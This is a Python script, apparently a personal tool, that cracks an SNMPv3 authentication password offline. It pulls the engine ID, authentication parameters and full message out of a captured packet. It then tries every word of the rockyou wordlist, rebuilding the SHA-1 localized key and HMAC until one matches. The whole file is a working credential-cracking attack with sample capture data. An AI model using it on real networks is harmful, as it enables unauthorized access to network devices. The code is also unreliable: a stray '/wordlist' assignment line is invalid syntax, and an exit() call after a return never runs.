'''
AuthKey calculation simplified from python implementation of snmpkey:
https://github.com/TheMysteriousX/SNMPv3-Hash-Generator

Write-up of process:
https://vad3rblog.wordpress.com/2017/09/11/snmp/

Bruteforce process ported from here:
https://github.com/SalimHaddou/snmp0wn-md5/blob/master/snmp0wn-md5.sh

[To-do]
- Add minLen/maxLen options
- Read pcap directly to extract msgWhole, etc
- Add command line arguments
'''

import hashlib
from multiprocessing import Pool
from itertools import repeat
from binascii import unhexlify

'''
Get the data for the following variables from a SNMPv3 packet in Wireshark. 
For msgAuthoritaiveEngineID, right click on the item of the same name and select "Copy as Hex Stream" and paste here.
For msgAuthenticationParameters, right click on the item of the same name and select "Copy as Hex Stream" and paste here.
For msgWhole, right click on Simple Network Management Protocol, select "Copy as Hex Stream" and paste here.
[To-Do] Determine if offsets are constant for msgAuthEngineID and msgAuthParam, and just grab them from msgWhole.
'''
msgAuthoritativeEngineID    = '80001f8880a919a2347169675d00000000'
msgAuthenticationParameters = '9302fe84910db7726fccfe81'
msgWhole                    = '307d020103301102043ad4e4e2020300ffe304010502010304333031041180001f8880a919a2347169675d0000000002010202012d0406666f6f626172040c9302fe84910db7726fccfe8104003030041180001f8880a919a2347169675d000000000400a11902044db7478a020100020100300b300906052b060102010500'
msgWhole                    =  msgWhole.replace(msgAuthenticationParameters,'0'*24)


# Constants/variables
#wordlist      = "dico.txt"
 /wordlist     = "/Users/scott/rockyou_utf8.txt"
ipad          = '36'*64
opad          = '5c'*64
l             = 1048576
passwordFound = ''

def check_password(passphrase):
        passphrase = passphrase.rstrip()

        # Calculate AuthKey
        reps = l // len(passphrase) + 1
        data = (''.join(list(repeat(passphrase, reps)))[:l]).encode('utf-8')
        Ku = hashlib.sha1(data).digest()
        E = bytearray.fromhex(msgAuthoritativeEngineID)
        AuthKey = hashlib.sha1(b''.join([Ku, E, Ku])).digest().hex()
        AuthKeyExtended = AuthKey+('0'*88)

        # Calculate testMsgAuthenticationParameters
        K1 = '{0:0{1}x}'.format((int(AuthKeyExtended, 16) ^ int(ipad, 16)),128)            
        K2 = '{0:0{1}x}'.format((int(AuthKeyExtended, 16) ^ int(opad, 16)),128)
        hashK1 = hashlib.sha1(unhexlify(K1+msgWhole)).hexdigest()
        hashK2 = hashlib.sha1(unhexlify(K2+hashK1)).hexdigest()
#        testMsgAuthenticationParameters = hashK2[0:24]

        # Check if calculated value equals
        if hashK2[0:24] == msgAuthenticationParameters:
            print("Password found: {}".format(passphrase))
            return(passphrase)
            exit()
        
pool = Pool()
results = []
with open(wordlist) as lines:
    results = pool.imap_unordered(check_password, lines)
    pool.close()
    for res in results:
        if res:
            passwordFound=res
            pool.terminate()
            break
pool.join()

if not passwordFound:
    print("No password found :(")

